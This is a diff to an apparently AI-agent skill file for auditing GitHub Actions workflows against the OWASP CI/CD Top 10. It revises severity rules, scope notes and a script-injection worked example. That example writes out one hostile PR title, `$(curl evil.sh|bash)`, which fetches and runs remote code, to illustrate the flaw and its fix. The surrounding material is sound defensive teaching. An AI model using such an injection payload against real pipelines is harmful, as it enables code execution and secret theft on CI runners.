@@ -1,8 +1,8 @@
 ---
 name: audit-github-actions-security
-description: Audit GitHub Actions workflow files (.github/workflows/*.yml, composite/reusable actions) against the OWASP Top 10 CI/CD Security Risks (CICD-SEC-1..10) — script injection via untrusted ${{ github.event }} expansion, pull_request_target/workflow_run pwn-requests, mutable action pins, over-broad GITHUB_TOKEN perms, long-lived secrets in workflow files where OIDC exists, exposed self-hosted runners, and more. Invoke when reviewing, hardening, or writing a GitHub Actions workflow or CI/CD pipeline config — including one that runs an agent — or vetting a workflow before merge. Skip when scanning for literal hardcoded credentials or the agent's model-API key posture on harness/context surfaces (use audit-secret-exposure), auditing an agent harness's output/dependency-install sinks (use audit-supply-chain-sinks), the harness's own sandbox/reversibility/kill-path even when the agent runs in CI (use audit-harness-safety), or an agent's private-data x untrusted-input x egress architecture (use audit-lethal-trifecta).
+description: Audit GitHub Actions workflow files (.github/workflows/*.yml, composite/reusable actions) against the OWASP Top 10 CI/CD Security Risks (CICD-SEC-1..10) — script injection via untrusted ${{ github.event }} expansion, pull_request_target/workflow_run pwn-requests, mutable action pins, over-broad GITHUB_TOKEN perms, long-lived secrets in workflow files where OIDC exists, exposed self-hosted runners, and more. Invoke when reviewing, hardening, or writing a GitHub Actions workflow or its CI/CD pipeline config — including one that runs an agent — or vetting one before merge. Skip when scanning for literal hardcoded credentials or the agent's model-API key posture on harness/context surfaces (use audit-secret-exposure), auditing an agent harness's output/dependency-install sinks (use audit-supply-chain-sinks), the harness's own sandbox/reversibility/kill-path even when the agent runs in CI (use audit-harness-safety), or an agent's private-data x untrusted-input x egress architecture (use audit-lethal-trifecta).
 user-invocable: true
-version: "0.4.0"
+version: "0.5.0"
 usage: /audit-github-actions-security [path-to-workflow-or-repo]
 ---
 
@@ -37,8 +37,10 @@ Top 10. **Out of scope:** a literal hardcoded-credential content scan of an *age
 (→ `audit-secret-exposure`); an *agent harness's* output/dependency-install sinks
 (→ `audit-supply-chain-sinks`); an *agent's* private-data × untrusted-input × egress architecture
 (→ `audit-lethal-trifecta`); non-GitHub CI platforms (GitLab/Jenkins/CircleCI — same OWASP categories,
-different syntax). It flags GitInject-class risk (untrusted PR content + elevated CI perms) as a
-*workflow* defect; the agent-architecture form routes to `audit-lethal-trifecta`.
+different syntax; no sibling skill covers them — state the gap and offer the CICD-SEC-1..10 categories
+as a manual checklist rather than auditing syntax this skill doesn't know). It flags GitInject-class
+risk (untrusted PR content + elevated CI perms) as a *workflow* defect; the agent-architecture form
+routes to `audit-lethal-trifecta`.
 
 ## Procedure
 1. **Inventory.** List every workflow + action, its triggers, top-level and per-job `permissions:`,
@@ -47,10 +49,13 @@ different syntax). It flags GitInject-class risk (untrusted PR content + elevate
    Done when every workflow and action file is inventoried — none skipped.
 2. **Run the detectors** in [`checks.md`](checks.md) (GHA-1…GHA-10), one pass per workflow.
    Done when every workflow × GHA check has a recorded verdict — no blanks.
-3. **Classify severity.** Critical = attacker code/secret exfil on a privileged runtime (GHA-1 script
-   injection, GHA-2 pwn-request, GHA-7 untrusted self-hosted runner). High = standing over-privilege or
-   mutable-trust (GHA-3 unpinned, GHA-4 token scope, GHA-5 secret/OIDC, GHA-6 flow control). Medium =
-   integrity/governance/visibility gaps (GHA-8, GHA-9, GHA-10).
+3. **Classify severity.** Default by check — Critical = attacker code/secret exfil on a privileged
+   runtime (GHA-1 script injection, GHA-2 pwn-request, GHA-7 untrusted self-hosted runner). High =
+   standing over-privilege or mutable-trust (GHA-3 unpinned, GHA-4 token scope, GHA-5 secret/OIDC,
+   GHA-6 flow control). Medium = integrity/governance/visibility gaps (GHA-8, GHA-9, GHA-10). The
+   default may move **one grade** on exploitability: a GHA-5 secret echoed to logs or reachable by a
+   fork build meets the exfil definition — Critical; a GHA-1 sink in a no-secrets, read-only, plain
+   `pull_request` workflow may drop to High.
    Done when every finding carries exactly one severity.
 4. **Recommend the deterministic fix per finding** (the `checks.md` Fix column) — env-bound expression,
    full SHA pin, `permissions: {}`, OIDC, environment protection, ephemeral runner — preferring the
@@ -72,8 +77,14 @@ each with Flags / Why→corpus(+OWASP/GitHub) / Fix→lesson, plus the GHA-0 pre
 ## Worked example (GHA-1, the script-injection sink)
 **Before:** `run: echo "Building PR ${{ github.event.pull_request.title }}"` — a PR titled
 `$(curl evil.sh|bash)` executes on the runner. **Finding:** Critical, GHA-1 / CICD-SEC-4.
-**After (the fix):** `env: { TITLE: ${{ github.event.pull_request.title }} }` then
-`run: echo "Building PR $TITLE"` — the value is data in an env var, never expanded into the shell.
+**After (the fix)** — bind to `env:` in block form (`${{ }}` inside a YAML flow map `{ }` is a
+parse error — never emit that shape):
+```yaml
+env:
+  TITLE: ${{ github.event.pull_request.title }}
+run: echo "Building PR $TITLE"
+```
+The value is data in an env var, never expanded into the shell.
 
 ## Output template
 ```
@@ -85,11 +96,11 @@ Workflows: <N> · OWASP basis: OWASP Top 10 CI/CD Security Risks (CICD-SEC-1..10
 |---|---|---|---|---|---|
 | Critical | GHA-1 | SEC-4 | ci.yml:31 | PR title in `run:` shell | bind to `env:` var; reference `"$VAR"` |
 | Critical | GHA-2 | SEC-4 | pr.yml:8  | `pull_request_target` checks out head + has secrets | split workflow; don't build untrusted code with secrets |
-| High | GHA-3 | SEC-3 | ci.yml:14 | `uses: actions/checkout@v4` (mutable tag) | pin to full commit SHA; Dependabot |
+| High | GHA-3 | SEC-3 | ci.yml:14 | `uses: some-org/setup-tool@v2` (third-party, mutable tag) | pin to full commit SHA; Dependabot |
 | High | GHA-4 | SEC-5 | ci.yml:1  | no top-level `permissions:` (default broad) | `permissions: {}` top-level; least per job |
 
 **Clean (precision guard):** <pinned/least-privilege/OIDC workflows that conform, and why.>
-**Unverified — confirm in settings:** <settings-level conjuncts not visible in YAML (fork-approval posture, environment reviewers, repo visibility/runner config, audit-log retention — the GHA-6/7/10 dispositions); listed for follow-up via `gh api`, never graded pass/fail.>
+**Unverified — confirm in settings:** <settings-level conjuncts not visible in YAML (fork-approval posture, environment reviewers, repo visibility/runner config, `ACTIONS_STEP_DEBUG`/audit-log retention — the GHA-6/7/10 dispositions); listed for follow-up via `gh api`, never graded pass/fail.>
 **Highest-impact fix:** <the one change to make first.>
 **Routed out:** <agent literal-secret scan → audit-secret-exposure; agent harness sinks → audit-supply-chain-sinks.>
 ```
